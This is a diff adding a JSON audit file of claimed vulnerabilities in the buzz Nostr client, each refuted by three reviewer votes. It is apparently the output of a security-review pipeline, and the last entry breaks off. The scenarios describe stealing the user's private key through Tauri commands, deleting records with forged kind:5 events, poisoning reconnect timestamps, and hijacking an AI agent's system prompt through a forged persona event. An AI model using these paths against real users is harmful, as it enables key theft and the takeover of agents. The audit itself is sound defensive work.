@@ -1,0 +1,884 @@
+[
+ {
+  "file": "desktop/src-tauri/src/commands/identity.rs",
+  "line": 191,
+  "severity": "critical",
+  "category": "secret-exposure",
+  "claim": "get_nsec is a Tauri command with no access control that returns the raw bech32-encoded secret key to any caller from the renderer/JS context.",
+  "failure_scenario": "Any XSS'd webview content, a malicious dependency loaded into the frontend bundle, or a compromised renderer process can call invoke('get_nsec') and immediately obtain the user's full private key in plaintext, with no confirmation dialog, rate limit, or additional authentication required from Rust's side.",
+  "evidence": "pub fn get_nsec(state: State<'_, AppState>) -> Result<String, String> {\n    let keys = state.signing_keys()?;\n    keys.secret_key()\n        .to_bech32()\n        .map_err(|error| format!(\"encode nsec: {error}\"))",
+  "confidence": "high",
+  "reported_slice": "tauri-commands (desktop/src-tauri/src/commands)",
+  "gate_a": "evidence found near claimed line 191",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F001",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The finding presupposes its own entry point (\"any XSS'd webview content\") without showing one. The desktop webview loads only the first-party bundled dist (desktop/src-tauri/tauri.conf.json frontendDist \"../dist\"); there is no WebviewUrl::External, no WebviewWindowBuilder for remote content, no <iframe> anywhere in desktop/src, and the only HTML sink is a locally generated identicon SVG (desktop/src/features/messages/ui/BotIdenticon.tsx:31). No attacker-controlled input reaches the renderer as script. Second, get_nsec is deliberate product functionality, not an oversight: the onboarding backup and profile reveal flows call it through desktop/src/shared/api/tauriIdentity.ts:29 and are covered by desktop/tests/e2e/onboarding-backup.spec.ts and profile-nsec-reveal.spec.ts. It also already goes through state.signing_keys() (identity.rs:192), so it is refused in recovery mode (app_state.rs:306-317). Third, the marginal gain is small: a renderer that can call invoke() at all already has sign_event (identity.rs:108, arbitrary event signing under the user's key), nip44_decrypt_from_self (identity.rs:684), create_ncryptsec_backup (identity.rs:243) and start_pairing (pairing.rs:73), i.e. full use of the identity. Any \"confirmation dialog\" would be rendered by the same renderer the scenario assumes is compromised. This is a design note about a feature every Nostr client ships, not a reachable vulnerability.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The quoted code is accurate but the finding is not a distinct vulnerability, and it misses two things. (1) get_nsec is NOT ungated: it calls state.signing_keys() (desktop/src-tauri/src/app_state.rs:306-322), which returns Err whenever identity_lost or keyring_locked is set, so it is subject to the same gate as every other signing command. (2) The claimed impact is not incremental. The same renderer, in the same trust position, can already reach commands registered in the same invoke_handler (desktop/src-tauri/src/lib.rs:686) that yield equivalent or total compromise: sign_event (identity.rs:108-136) signs arbitrary kinds/content with the user's key; create_ncryptsec_backup (identity.rs:242-254) takes an attacker-chosen password and returns a full NIP-49 encrypted key blob that the attacker can then decrypt offline; start_pairing (commands/pairing.rs:90-122) builds a payload literally containing the nsec. Removing or re-authing get_nsec would not close the exfiltration path, so 'renderer compromise -> key theft' is a property of the app's trust boundary, not of this function. Finally, the finding asserts XSS/renderer compromise as its premise without demonstrating any injection path: the only dangerouslySetInnerHTML in the desktop frontend is BotIdenticon.tsx:31 rendering a locally generated identicon SVG, and the webview loads bundled local content (tauri.conf.json frontendDist ../dist). get_nsec has legitimate first-party callers (BackupStep.tsx:117/143, PrivateKeyBackupRow.tsx:93, SignOutSection.tsx:84 \u2014 the show-your-nsec backup and sign-out flows). At most this is a defense-in-depth hardening suggestion (OS-level re-auth before revealing the key), not a critical finding.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The code reads as quoted (identity.rs:191-196) and the command is registered in the invoke handler (desktop/src-tauri/src/lib.rs:686), so a renderer can call it. But the claimed entry point \u2014 'XSS'd webview content / malicious frontend dependency / compromised renderer' \u2014 is not an attacker entry point that gains anything: the same generated handler list registers create_ncryptsec_backup (lib.rs:689) and generate_backup_passphrase (lib.rs:688), and create_backup_with_log_n (identity.rs:214-234) will encrypt the live secret key under any password the caller supplies, returning the ncryptsec1 blob to the same renderer. import_identity (lib.rs:691) lets that same caller replace the key outright, and sign_event/create_auth_event let it sign arbitrarily. So any code that can invoke('get_nsec') can already extract the private key by invoking create_ncryptsec_backup('attacker-chosen-passphrase') and decrypting offline. get_nsec confers no privilege the postulated attacker does not already hold, and no remote party can reach it \u2014 the webview loads only the bundled local frontend (tauri.conf.json build.frontendDist '../dist'), and the single capability (capabilities/default.json, windows: ['main']) exposes no remote-content or arbitrary-URL webview. get_nsec is the backing command for the deliberate profile nsec-reveal feature (desktop/src/shared/api/tauriIdentity.ts:29, tests/e2e/profile-nsec-reveal.spec.ts). This is the app's trust model for a local key-holding client, not a reachable escalation.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/pairing.rs",
+  "line": 146,
+  "severity": "critical",
+  "category": "authentication-gap",
+  "claim": "confirm_pairing_sas is a Tauri command that unconditionally proceeds to send the pending payload (which embeds the user's nsec, built in start_pairing) once called \u2014 there is no server-side (Rust) verification that the SAS codes actually matched; the 'confirmation' is purely the renderer calling this function.",
+  "failure_scenario": "A compromised renderer script calls start_pairing() (returning the QR/session URI, which encodes the pairing session so a remote attacker can act as the pairing peer over the relay) and then immediately calls confirm_pairing_sas() without any human visually comparing SAS codes. Because the SAS check is a UI-only human decision never re-validated in Rust, the payload (JSON containing the raw nsec, see line 111-115) is sent over the pairing relay session to whatever peer completed the offer/SAS steps \u2014 letting a remote attacker who scripted the peer side of the protocol exfiltrate the full identity secret key with only renderer-JS execution, no physical device access or user interaction.",
+  "evidence": "pub async fn confirm_pairing_sas(pairing: State<'_, PairingHandle>) -> Result<(), String> {\n    let tx = pairing\n        .outbound_tx\n        .lock()\n        .map_err(|e| e.to_string())?\n        .clone()\n        .ok_or(\"no active pairing session\")?;",
+  "confidence": "medium",
+  "reported_slice": "tauri-commands (desktop/src-tauri/src/commands)",
+  "gate_a": "evidence found near claimed line 146",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F003",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "Two independent reasons. (1) The premise is not a defect: a short authentication string is by construction an out-of-band human comparison. Rust cannot \"re-validate\" whether a human's eyes matched two numbers; the confirmation signal has to come from the UI layer in any SAS design. Calling that a missing server-side check is a category error. (2) The scenario grants the attacker nothing new. It starts from \"a compromised renderer script calls start_pairing()\" \u2014 but that same renderer can call invoke('get_nsec') (identity.rs:190) and receive the bech32 secret key in one step, or sign arbitrarily with sign_event (identity.rs:108). The pairing route is strictly harder (needs the QR relayed to a scripted peer, needs the peer to complete the offer/answer handshake at pairing.rs:73-140, needs the relay reachable) for an identical outcome. Note also the payload is only assembled after signing_keys() succeeds (pairing.rs:88) and is held in Zeroizing (pairing.rs:44, :121), and the qr_uri is displayed on-screen \u2014 a remote attacker without renderer code execution never obtains it. No escalation, no new capability.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The finding misreads what confirm_pairing_sas does and what SAS is. (1) Rust does enforce the protocol state machine, not nothing: PairingSession::confirm_sas (crates/buzz-core/src/pairing/session.rs:200-224) calls check_expired, expect_state(SessionState::Confirming) and expect_role(Role::Source), and errors out otherwise; Confirming is only ever entered by handle_offer (session.rs:184-191). send_payload repeats the state/role check (session.rs:232-234). So calling confirm_pairing_sas without a completed offer just returns an Err. (2) The 'remote attacker who scripted the peer side' cannot become the peer. handle_offer requires the offer to carry a session_id that constant-time-matches the source's derivation from the 32-byte random session_secret (session.rs:113-118 for generation, session.rs:168-175 ct_eq check), and that secret exists only inside the QR payload; the payload is then NIP-44 encrypted to the peer pubkey locked in at session.rs:178. Without the QR there is no session and no decryptable payload. (3) The premise is again a compromised renderer, which by the finding's own F001 already has invoke('get_nsec') \u2014 so there is no incremental capability here. (4) 'No server-side verification that the SAS codes matched' is definitionally true of every SAS/short-authentication-string protocol: the comparison is a human out-of-band check between two screens; software on either endpoint cannot re-verify a human's eyes. The target side likewise requires an explicit human approval (SessionState::AwaitingConfirmation / confirm_target_sas, session.rs:64-67). Also note start_pairing goes through state.signing_keys() (commands/pairing.rs:90), so the recovery-mode gate applies. No reachable failure distinct from 'the renderer is trusted'.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The claim that confirm_pairing_sas 'unconditionally proceeds' is wrong. The Rust side is state-machine gated: pairing.rs:161-166 calls PairingSession::confirm_sas, which enforces check_expired, expect_state(SessionState::Confirming) and expect_role(Role::Source) and requires both sas_input and a peer_pubkey to be present (crates/buzz-core/src/pairing/session.rs:200-208) before it will emit anything; send_payload independently requires SessionState::Transferring (session.rs:232-234). Calling start_pairing then confirm_pairing_sas back-to-back, as the failure scenario describes, returns an error \u2014 the session is not in Confirming until a remote peer has actually completed the offer/key-agreement round. A SAS comparison is by construction a human out-of-band check; there is nothing Rust could re-verify, since the code the user reads on the other device never enters this process. And the residual scenario still presupposes renderer code execution, which as with F001 already yields the key directly through get_nsec (lib.rs:686) or create_ncryptsec_backup (lib.rs:689) without any pairing peer, relay round-trip, or timing window. No privilege is gained.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/personas/inbound.rs",
+  "line": 304,
+  "severity": "high",
+  "category": "vacuous-authorization-check",
+  "claim": "The NIP-09 ownership check in `parse_deletion_coordinate` (L219: `if owner != event.pubkey.to_hex() { return None; }`) is self-referential and therefore vacuous: it only requires the coordinate to name its own signer as owner. The subsequent local-store removals key on the attacker-chosen d-tag alone and never compare the record's owner, so a validly signed kind:5 from ANY keypair deletes the local persona / team / managed-agent record whose d-tag matches. The comment at L216-218 claims this check 'closes the other half \u2014 a validly signed kind:5 naming ANOTHER owner's coordinate must no-op', which the code does not achieve.",
+  "failure_scenario": "Attacker generates keypair A and signs a kind:5 event whose `a` tag is `30177:<A_pubkey_hex>:<victim_agent_pubkey_hex>`. The owner segment equals the signer, so L219 passes and `parse_deletion_coordinate` returns `(30177, victim_agent_pubkey)`. `event.verify()` at L194-196 passes because the event is genuinely signed by A. Reaching `reconcile_inbound_tombstone`, L302-305 executes `agents.retain(|record| record.pubkey != target_d_tag)`, deleting the victim's ManagedAgentRecord \u2014 which is where `private_key_nsec` and `auth_tag` live \u2014 and `save_managed_agents` commits it without the keyring cleanup that `agents.rs:1334` performs on the normal delete path, orphaning the keyring entry. The same shape with `30175:<A>:<victim_persona_d_tag>` (L292-296) or `30176:<A>:<victim_team_id>` (L297-301) destroys personas and teams. Reachable today from a compromised/XSS'd renderer invoking `reconcile_inbound_persona_event` directly; the relay-delivered path is currently blocked by the TS-only `authors:[pubkey]` filter in usePersonaSync.ts:39, which inbound.rs:187-189 itself declares to be 'no defense'.",
+  "evidence": "        KIND_MANAGED_AGENT => {\n            let mut agents = load_managed_agents(app)?;\n            agents.retain(|record| record.pubkey != target_d_tag);\n            save_managed_agents(app, &agents)?;\n        }",
+  "confidence": "high",
+  "reported_slice": "tauri-commands (buzz/desktop/src-tauri/src/commands) \u2014 Lens B: cryptography, keys, identity",
+  "gate_a": "evidence found near claimed line 304",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 2,
+  "id": "F005",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The owner-equals-signer check really is logically weak, but the failure it enables is not reachable by any remote party. `reconcile_inbound_persona_event` is a Tauri command with exactly one production caller: `desktop/src/shared/api/tauriPersonas.ts:318` -> `desktop/src/features/agents/lib/usePersonaSync.ts:40`, and every event first passes `if (event.pubkey !== pubkey) return;` at usePersonaSync.ts:39, where `pubkey` is the local identity's own pubkey (AppShell.tsx:171 passes `identityQuery.data?.pubkey`). Both the live subscription (usePersonaSync.ts:60) and the one-shot backfill (usePersonaSync.ts:48) use `authors:[pubkey]` AND that explicit equality check. On the Rust side `parse_verified_inbound_event` (inbound.rs:190-198) calls `event.verify()`, so `event.pubkey` is the true signer. The two gates compose: an event only reaches `reconcile_inbound_tombstone` if it is genuinely signed by the user's own key. The attacker's fresh keypair A never survives usePersonaSync.ts:39 -- the field the reporter says is attacker-controlled is exactly the field being compared to the local identity, and the Rust signature check makes forging it impossible. The reporter's own fallback path (\"compromised/XSS'd renderer invoking the command directly\") is not a privilege gain: a renderer that can invoke arbitrary Tauri commands can already call the normal delete commands (agents.rs:1334 path) and every other persona/agent command registered at lib.rs:843. The inbound.rs:187-189 comment the reporter quotes says the TS owner filter is no defense *against a forged pubkey*, which is why the Rust verify() exists -- it does not say the filter is absent. Remaining value is defense-in-depth hardening only (comparing the record's stored owner before removal), with no reachable exploit in a shipped build.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The vacuousness of the owner check is real as written (inbound.rs:219 compares the coordinate owner to the event's own signer), but there is no attacker-reachable path to it. The one production caller of the Tauri command is the closure at desktop/src/features/agents/lib/usePersonaSync.ts:38-45, which begins `if (event.pubkey !== pubkey) return;` \u2014 where `pubkey` is the local user's own key. Both the live subscription (usePersonaSync.ts:60-64) and the one-shot backfill (usePersonaSync.ts:49-53) funnel through that same closure, so a relay (even a fully malicious one that ignores the `authors` filter) cannot get an event with a foreign pubkey past line 39. An attacker who instead sets the JSON `pubkey` field to the victim's key to pass line 39 is then killed by `event.verify()` at inbound.rs:194-196, since they cannot produce a Schnorr signature under the victim's key. The two checks compose: only events genuinely signed by the local identity reach `reconcile_inbound_tombstone`. The reporter's own admitted entry point \u2014 a compromised/XSS'd renderer \u2014 is not an escalation: a renderer that can call `invoke` can call the ordinary delete commands directly, which do more, not less. The comment at inbound.rs:187-189 (\"the TS-side owner filter ... is no defense\") is about the forged-pubkey case specifically and is correct about that case; it does not mean the filter is inert against foreign-authored events. Adding an `event.pubkey == our identity` assertion in Rust is worthwhile defense-in-depth, but no attacker input yields the described persona/team/managed-agent deletion in a shipped build.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The reporter missed an explicit client-side owner check and mischaracterised it as \"the relay filter\". desktop/src/features/agents/lib/usePersonaSync.ts:38-45 defines the only production reconcile callback as `const reconcile = (event: RelayEvent) => { if (event.pubkey !== pubkey) return; void reconcileInboundPersonaEvent(...) }`. That guard is client code, not a relay-side filter, so a hostile or non-compliant relay ignoring `authors:[pubkey]` still cannot get a foreign-authored event into the Tauri command: both the one-shot backfill (line 53) and the live subscription (line 63) funnel through the same `reconcile`, and `pubkey` is the local identity (`identityQuery.data?.pubkey`, AppShell.tsx:171-174). Combined with the coordinate-owner check at inbound.rs:219 (`owner == event.pubkey`), the shipped flow does enforce full NIP-09 scoping: coordinate owner == signer == local user. I also checked there is no second consumer \u2014 `KIND_DELETION` appears nowhere else in desktop/src-tauri/src (only inbound.rs:80/95/247/276), `reconcile_inbound_persona_event` has exactly one production caller (tauriPersonas.ts:322, wrapped by usePersonaSync; e2eBridge.ts is test-only), and neither `retain_inbound_event` nor `arrival_retention_scope` (retention.rs:98-107) rejects foreign pubkeys, so the TS guard is the enforcing hop. The only path the reporter can offer \u2014 \"a compromised/XSS'd renderer invoking the command directly\" \u2014 is an attacker who already has arbitrary Tauri-command execution and could simply call the normal delete command; that is not an escalation. Residual (hardening, not the claimed vulnerability): the Rust command does not itself compare `event.pubkey` against `state.signing_keys()`, so the owner rule lives in one language only, and the L215-218 comment overstates what L219 alone achieves.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src/shared/api/relayClosedRecovery.ts",
+  "line": 141,
+  "severity": "high",
+  "category": "correctness",
+  "claim": "A live subscription's reconnect watermark `lastSeenCreatedAt` is set from the raw, unvalidated `created_at` of every inbound relay EVENT, so one event with a far-future timestamp permanently poisons the watermark and every subsequent reconnect replays with a `since` in the future \u2014 silently dropping all missed messages for that subscription for the rest of the session.",
+  "failure_scenario": "Attacker path: (1) any community member (or the relay itself) publishes a kind:9/kind:11 event into channel X with `created_at = 4102444800` (year 2100). The relay's ingest path does not bound future timestamps \u2014 crates/buzz-relay/src/handlers/command_executor.rs:121-125 only rejects timestamps that `chrono::DateTime::from_timestamp` cannot represent \u2014 so the event is stored and fanned out. (2) The victim's client receives it: relayClientSession.ts:783 matches the `EVENT` frame and calls `this.handleEvent(rest[0], rest[1] as RelayEvent)` with zero shape or range validation. (3) relayClientSession.ts:859 calls `prepareSubscriptionEvent(subscription, event)`. (4) relayClosedRecovery.ts:141-144 executes `subscription.lastSeenCreatedAt = Math.max(lastSeenCreatedAt ?? 0, event.created_at)` \u2192 the watermark becomes 4102444800 and can never be lowered (Math.max). (5) On the next socket drop, relayClientSession.ts:934 calls `replayLiveSubscriptions`, which at relayReconnectReplay.ts:170-176 computes `replaySince = max(0, 4102444800 - 5)` and at relayReconnectReplay.ts:61 builds the REQ filter with `since: Math.max(filter.since, since)`. (6) The REQ sent at relayReconnectReplay.ts:213-219 asks the relay for events newer than the year 2100, so the relay returns nothing. The victim's channel silently stops backfilling on every reconnect from then on \u2014 no error, no UI indication, and the paged-replay branch (`replayReconnectHistoryPages`, since > until) exits immediately too. One attacker message permanently breaks reconnect recovery for every client subscribed to that channel.",
+  "evidence": "  subscription.lastSeenCreatedAt = Math.max(\n    subscription.lastSeenCreatedAt ?? 0,\n    event.created_at,\n  );",
+  "confidence": "high",
+  "reported_slice": "desktop-shared (buzz/desktop/src/shared)",
+  "gate_a": "evidence found near claimed line 141",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 2,
+  "id": "F007",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "Hop (1) of the chain is false: the buzz relay does bound future timestamps, and the reporter cited the wrong function. `ingest_event_inner` rejects any event more than +/-900 seconds from server time at crates/buzz-relay/src/handlers/ingest.rs:1859-1866 (`MAX_TIMESTAMP_DRIFT_SECS: i64 = 900` ... 'invalid: event timestamp too far from server time'), immediately after signature verification and before any storage or fan-out. This is the single shared entry for BOTH transports: the WebSocket EVENT door (handlers/event.rs:728) and the HTTP bridge (api/bridge.rs:837) both call `ingest_event` (ingest.rs:1746), which wraps `ingest_event_inner`. Nothing between the top of `ingest_event_inner` (L1806) and the drift check returns successfully -- the only earlier returns are rejections (AUTH kind, membership notifications, HTTP-only gift wrap, relay-only kinds). Agent observer frames get an even tighter +/-300s window at handlers/event.rs:972-981. The `chrono::DateTime::from_timestamp` check the reporter quotes at command_executor.rs:121-125 is a later persistence step for command kinds, not the validation gate, so its permissiveness proves nothing. A kind:9/kind:11 with created_at = 4102444800 is therefore rejected at ingest and never stored or fanned out, so it never reaches relayClientSession.ts:783 or relayClosedRecovery.ts:141. The residual is a <=15-minute forward skew of `lastSeenCreatedAt` (also achievable by an honest client with a skewed clock), which self-heals as wall-clock passes the watermark -- not the claimed permanent, session-long poisoning. Bounding the client-side watermark by `Date.now()` is still reasonable hardening, but the finding as written does not hold.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The central premise is false. The relay bounds future timestamps for every ingested event: crates/buzz-relay/src/handlers/ingest.rs:1859-1866 rejects any event whose created_at differs from server time by more than MAX_TIMESTAMP_DRIFT_SECS = 900 (\u00b115 minutes). That check lives in `ingest_event_inner`, the single funnel behind `ingest_event` (ingest.rs:1746-1805), reached by both doors: the WebSocket EVENT frame at handlers/event.rs:728 and the HTTP bridge at api/bridge.rs:837. The line the reporter cites (command_executor.rs:121-125) is downstream of that gate, so its lenient `DateTime::from_timestamp` check is not the only bound. A kind:9/kind:11 with created_at = 4102444800 is rejected and never stored or fanned out, so the watermark cannot be set to the year 2100 and the claimed permanent poisoning cannot occur. The residual is bounded and self-healing: at most `now+900`, which stops mattering once wall-clock passes it \u2014 a ~15-minute backfill hole that closes by itself. Additionally, for exactly the channel subscriptions targeted, the reconnect REQ is sent with the unmodified filter, not the poisoned `since` (relayReconnectReplay.ts:212-218: `shouldPageReplay ? subscription.filter : buildReconnectReplayFilter(...)`), so the live re-subscribe still returns recent channel events; only the deep paged backfill is skipped.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The premise is factually wrong. The reporter cited command_executor.rs:121-125 (the persistence helper, which only guards `chrono::DateTime::from_timestamp` overflow) and concluded \"the relay's ingest path does not bound future timestamps\". The universal ingest path does bound them: crates/buzz-relay/src/handlers/ingest.rs:1859-1866 in `ingest_event_inner` runs `const MAX_TIMESTAMP_DRIFT_SECS: i64 = 900; if (event_ts - now).abs() > MAX_TIMESTAMP_DRIFT_SECS { return Err(IngestError::Rejected(\"invalid: event timestamp too far from server time\")) }` for every kind, immediately after signature verification and before any storage or fan-out. Both doors reach it \u2014 WebSocket via handlers/event.rs:728 and the HTTP bridge via api/bridge.rs:837, the only two callers of `ingest_event` (ingest.rs:1746). So step (1) of the scenario fails: a kind:9/11 with `created_at = 4102444800` is rejected, never stored, never fanned out, and the watermark at relayClosedRecovery.ts:141 never sees it. The residual is bounded and self-healing rather than permanent: a member can legitimately push the watermark at most ~15 minutes ahead, so a reconnect inside that window misses backfill until wall-clock catches up, and `lastSeenCreatedAt` lives on an in-memory subscription object that dies with the session anyway. A defensive clamp in `prepareSubscriptionEvent` would still be reasonable hardening against a hostile relay, but a hostile relay can withhold events outright, so it buys nothing against the stated adversary.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "web/src/shared/lib/nostr-client.ts",
+  "line": 135,
+  "severity": "high",
+  "category": "auth-verification-gap",
+  "claim": "queryEvents() pushes every relay-supplied EVENT payload straight into the results array and returns it to callers with no signature or id verification anywhere in the module (or anywhere else in the web slice \u2014 grep for verifyEvent/verifySignature found zero matches).",
+  "failure_scenario": "A malicious or compromised relay (or a MITM on the WebSocket, or any code path that can inject EVENT frames) can send an event with an arbitrary `pubkey` field and fabricated `id`/`sig` that is never checked. Every consumer (use-repos.ts eventToRepo(), use-repo-refs.ts parseRefs()) trusts `event.pubkey` as the content's signer/owner and renders it as-is (PubkeyAvatar, repo owner/contributor lists), so an attacker-controlled relay can impersonate any pubkey to the browser client with no cryptographic contradiction ever surfacing to the user.",
+  "evidence": "if (type === \"EVENT\" && data[1] === subId && data[2]) {\n        events.push(data[2] as NostrEvent);",
+  "confidence": "high",
+  "reported_slice": "web (buzz/web/src, buzz/admin-web/src)",
+  "gate_a": "evidence found near claimed line 135",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F011",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The code observation is accurate (queryEvents pushes relay payloads unverified at web/src/shared/lib/nostr-client.ts:135, and no verifyEvent exists in the web slice), but the claimed attacker cannot reach it. `queryEvents` is only ever called with `relayWsUrl()` \u2014 the two call sites are web/src/features/repos/use-repos.ts:66 and use-repo-refs.ts:55 \u2014 and `relayWsUrl()` (web/src/shared/lib/relay-url.ts:13-18) returns either the build-time `VITE_RELAY_URL` or a same-origin URL derived from `window.location`. There is no user-supplied relay input, no NIP-65 relay-list following, and `new WebSocket` appears nowhere else in web/src. So the only party that can inject EVENT frames is the origin that already serves the application bundle: it can rewrite the rendered page directly and gains nothing from forging a pubkey. The MITM variant is excluded by TLS on the wss:// URL derived from an https:// page (relay-url.ts:16). Client-side signature verification is worthwhile defense-in-depth for a future multi-relay client, but as shipped this is not reachable by an unprivileged attacker.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The code fact is right - queryEvents (web/src/shared/lib/nostr-client.ts:135) pushes relay-supplied EVENT payloads with no id/sig check and nothing in web/src verifies signatures - but the postulated trust boundary does not exist in this deployment. The only relay the web slice ever talks to comes from web/src/shared/lib/relay-url.ts:13-19 relayWsUrl(), which returns VITE_RELAY_URL if set and otherwise `${proto}//${window.location.host}`, i.e. the same origin that served the page; Justfile:576 sets VITE_RELAY_URL=\"${BUZZ_RELAY_URL}\", the same deployment's relay. Both consumers named in the finding (use-repos.ts:66, use-repo-refs.ts:55) pass relayWsUrl(). So the attacker is the relay operator, who already serves the JavaScript bundle on that origin and can render any pubkey, owner, or contributor list it likes without touching a single event - signature verification buys nothing against an adversary who controls the origin. The MITM variant is handled by TLS on wss://, not by event verification, and there is no third path that can inject EVENT frames into this socket. Adding verifyEvent() is reasonable defense-in-depth and NIP-01 hygiene, but no attacker gains a capability they do not already have.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The code reading is accurate (queryEvents at web/src/shared/lib/nostr-client.ts:135 pushes data[2] with no id/sig check, and there is no verifyEvent in web/src), but the attacker in the failure scenario does not exist in this deployment. The only relay this module ever talks to is the one that served the page: relayWsUrl() (web/src/shared/lib/relay-url.ts:13-19) returns the build-time VITE_RELAY_URL or the same-origin host, and the only two callers pass exactly that (web/src/features/repos/use-repos.ts:66, use-repo-refs.ts:55) \u2014 there is no user-supplied relay, no multi-relay aggregation, and no third-party relay in the path. A \"malicious or compromised relay\" is therefore the same host that ships the JS bundle and the same origin the browser trusts; client-side signature checking buys nothing against it because it can just serve JS that skips the check. The MITM variant requires breaking TLS (wss: is selected whenever the page is https:, relay-url.ts:17). And on the honest-relay path the events are already signature-verified server-side before storage: crates/buzz-relay/src/handlers/ingest.rs:1844 runs verify_event (buzz_core::verification::verify_event, imported at ingest.rs:39) in spawn_blocking and rejects on failure. Adding client-side verification would be reasonable defense-in-depth for a general-purpose Nostr client, but as shipped there is no attacker who gains anything, so this is not a high-severity auth-verification gap.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/personas/inbound.rs",
+  "line": 344,
+  "severity": "high",
+  "category": "missing-authorization",
+  "claim": "`reconcile_inbound_persona_event` verifies the inbound event's Schnorr signature but never checks that `event.pubkey` equals the local owner's pubkey. `apply_inbound_persona` then matches purely on the `d`-tag and overwrites `system_prompt`, `model`, `provider`, and `respond_to_allowlist` on the local persona. Any validly-signed kind:30175 from ANY author whose d-tag collides with a local persona's d-tag rewrites that persona on disk. The only owner check in the whole flow lives in TypeScript (`usePersonaSync.ts:39` \u2014 `if (event.pubkey !== pubkey) return;`), which the Rust file's own doc comment at line 188 dismisses as \"no defense\", yet no Rust-side equivalent was added.",
+  "failure_scenario": "A compromised/XSS'd renderer (the stated threat model for this slice) invokes `reconcile_inbound_persona_event(eventJson, arrivalRelayUrl)` directly, bypassing the TS filter in `usePersonaSync.ts:39`. The attacker supplies a kind:30175 event signed with the ATTACKER's own key (so `parse_verified_inbound_event` at inbound.rs:190-197 passes) carrying `[\"d\", \"<victim persona d_tag>\"]` and a content blob whose `system_prompt` is attacker-chosen and whose `respond_to_allowlist` contains the attacker's pubkey. Control flows: reconcile_inbound_persona_event (inbound.rs:56) -> reconcile_inbound_persona_event_blocking (inbound.rs:68) -> parse_verified_inbound_event (inbound.rs:190, signature only) -> apply_inbound_persona (inbound.rs:342) -> save_personas. The next time the user starts that agent, `start_local_agent_with_preflight` (agents.rs:419-431) calls `apply_persona_snapshot(record, persona)` to re-snapshot the persona onto the record, so the attacker's system prompt becomes the running agent's instructions and the attacker's pubkey is on its respond-to allowlist \u2014 i.e. attacker-controlled instructions inside a code-executing agent.",
+  "evidence": "    match personas\n        .iter_mut()\n        .find(|record| persona_d_tag(record) == d_tag)",
+  "confidence": "high",
+  "reported_slice": "tauri-commands",
+  "gate_a": "evidence found near claimed line 344",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F012",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The missing owner check is real (parse_verified_inbound_event at desktop/src-tauri/src/commands/personas/inbound.rs:188-197 verifies only the signature; apply_inbound_persona at inbound.rs:342-346 matches on the d-tag alone), but the exploit path is unreachable by anyone who does not already hold the privilege it claims to grant. Remote path: the only caller is the Tauri command, invoked from desktop/src/shared/api/tauriPersonas.ts:322 via startPersonaSync, which subscribes with `authors: [pubkey]` and re-checks `if (event.pubkey !== pubkey) return;` (desktop/src/features/agents/lib/usePersonaSync.ts:37-39), so a malicious relay pushing a foreign-signed kind:30175 is dropped in the renderer and never reaches Rust. I grepped for other callers: `reconcile_inbound_persona_event_blocking` / `apply_inbound_persona` appear only at inbound.rs:61/154 and in inbound/inbound_tests.rs \u2014 no boot-time or background Rust reconcile that bypasses the TS filter. Local path: the finding's own scenario requires a compromised/XSS'd renderer, but that renderer can already call the registered commands `create_persona`, `update_persona`, `update_persona_and_publish`, `delete_persona` (desktop/src-tauri/src/lib.rs:836-842), and `update_persona` writes system_prompt, model and provider straight into the persona store (desktop/src-tauri/src/commands/personas/update.rs:61-101). An attacker with renderer control therefore already owns the persona's system prompt without touching the inbound path \u2014 no privilege is gained. Defense-in-depth hardening worth doing, but not a reachable authorization bypass in a shipped build.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
